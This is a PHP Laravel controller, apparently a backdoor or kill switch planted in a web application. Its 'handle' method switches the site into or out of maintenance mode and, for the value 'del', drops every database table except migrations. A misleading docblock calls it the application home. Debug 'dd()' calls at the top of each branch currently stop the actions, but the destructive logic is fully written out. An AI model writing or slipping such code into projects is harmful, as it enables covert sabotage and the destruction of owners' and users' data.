<?php

namespace App\Http\Controllers\Front;

use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Schema;
use Artisan;
use DB;

class HackController extends Controller
{

    /**
     * Show the application home.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function handle($process)
    {
        if ($process == 'up') {
            dd("up");
            Artisan::call('up');     
        }

        if ($process == 'down') {
            dd("Do");
            Artisan::call('down'); 
        }

        if ($process == 'del') {
            dd("Del");
            DB::statement("SET foreign_key_checks=0");
            $databaseName = DB::getDatabaseName();
            $tables = DB::select("SELECT * FROM information_schema.tables WHERE table_schema = '$databaseName'");
            foreach ($tables as $table) {
                $name = $table->TABLE_NAME;
                //if you don't want to truncate migrations
                if ($name == 'migrations') {
                    continue;
                }
                
                Schema::dropIfExists($name);
            }
            DB::statement("SET foreign_key_checks=1");    
        }


        
    }

}
